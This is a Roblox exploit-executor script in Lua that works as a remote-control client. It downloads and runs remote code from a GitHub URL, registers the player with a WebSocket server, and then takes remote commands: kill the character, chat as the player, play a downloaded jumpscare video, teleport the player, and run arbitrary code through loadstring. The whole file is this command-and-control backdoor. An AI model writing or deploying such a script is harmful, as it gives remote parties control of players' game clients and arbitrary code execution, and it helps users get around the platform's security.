if getgenv().oldws then
	getgenv().forceClosing = true
	getgenv().oldws:Close()
end
getgenv().forceClosing = false
-- Services / Variables
local connectionManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/EXT/main/connections.lua", true))().new("Id")
local localPlayer = game:GetService("Players").LocalPlayer
local httpService = game:GetService("HttpService")

-- Our connection data
local userdata = {
	action = "newuser",
	userid = localPlayer.UserId,
	username = localPlayer.Name,
}

local sendCmdResponse
-- Commands
local commands = {
	kill = function(sender, args)
		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")

		if humanoid and humanoid.Health > 0 then
			humanoid:TakeDamage(humanoid.MaxHealth)
			return sendCmdResponse(sender, true, "Killed")
		end

		return sendCmdResponse(sender, false, "Failed to kill")
	end,

	say = function(sender, args)
		if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
			local channel: TextChannel = game:GetService("TextChatService").TextChannels.RBXGeneral
			channel:SendAsync(args.Message)
			return sendCmdResponse(sender, true, "Successfully sent message")
		else
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(args.Message, "All")
			return sendCmdResponse(sender, true, "Successfully sent message")
		end

		return sendCmdResponse(sender, false, "Failed to send message")
	end,

	jumpscare = function(sender, args)
		coroutine.wrap(function()
			if not writefile or not getcustomasset or not request then
				return sendCmdResponse(sender, false, "Executor not supported")
			end
			sendCmdResponse(sender, true, "Successfully executed jumpscare")

			writefile("scream.mp3", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/ScreamSfx.mp3", Method = "GET" }).Body)

			writefile("skibidi.webm", request({ Url = `https://github.com/Grayy12/maxhubassets/raw/main/{args.type == "balls" and "balls" or "skibidi"}.webm`, Method = "GET" }).Body)

			local items = {
				["_ScreenGui"] = Instance.new("ScreenGui"),
				["_VideoFrame"] = Instance.new("VideoFrame"),
			}

			items["_ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			items["_ScreenGui"].Parent = (gethui and gethui()) or game:GetService("CoreGui")

			items["_VideoFrame"].AnchorPoint = Vector2.new(0.5, 0.5)
			items["_VideoFrame"].Position = UDim2.new(0.5, 0, 0.5, 0)
			items["_VideoFrame"].Size = UDim2.new(1, 0, 1, 0)
			items["_VideoFrame"].ZIndex = 9999
			items["_VideoFrame"].Parent = items["_ScreenGui"]
			items["_VideoFrame"].Video = getcustomasset("skibidi.webm", true)

			local sound = Instance.new("Sound", workspace)
			sound.SoundId = getcustomasset("scream.mp3", true)
			sound.Volume = 0.5
			sound:Play()

			items["_VideoFrame"].Looped = false
			items["_VideoFrame"]:Play()

			items["_VideoFrame"].Ended:Wait()

			items["_ScreenGui"]:Destroy()
			delfile("scream.mp3")
			delfile("skibidi.webm")

			sendCmdResponse(sender, true, "jumpscare ended")
		end)()
	end,

	teleport = function(sender, args)
		sendCmdResponse(sender, true, "Successfully joined place")
		if args.JobId then
			game:GetService("TeleportService"):TeleportToPlaceInstance(args.PlaceId, args.JobId, localPlayer)
		else
			game:GetService("TeleportService"):Teleport(args.PlaceId, localPlayer)
		end
	end,

	execute = function(sender, args)
		xpcall(function()
			loadstring(args.Code)()
			sendCmdResponse(sender, true, "Successfully executed code")
		end, function(err)
			sendCmdResponse(sender, false, err)
		end)
	end,
}

-- WebSocket Client
local function connectToServer()
	local ws = WebSocket.connect("ws://localhost:3001/ws")
	getgenv().oldws = ws

	-- Send user data so the server knows who we are
	ws:Send(httpService:JSONEncode(userdata))

	-- Listen for messages
	connectionManager:NewConnection(ws.OnMessage, function(msg)
		local data = httpService:JSONDecode(msg)

		if data.action == "run" then
			local cmd = commands[data.cmd]
			if cmd then
				pcall(cmd, data.sender, data.args)
			end
		end
	end)

	-- Listen for close
	connectionManager:NewConnection(ws.OnClose, function()
		if not getgenv().forceClosing then
			pcall(connectToServer)
		end
	end)

	sendCmdResponse = function(receiver, success, response)
		ws:Send(httpService:JSONEncode({
			action = "cmdresponse",
			sender = localPlayer.Name,
			receiver = receiver,
			success = success,
			response = response,
		}))
	end
end

pcall(connectToServer)
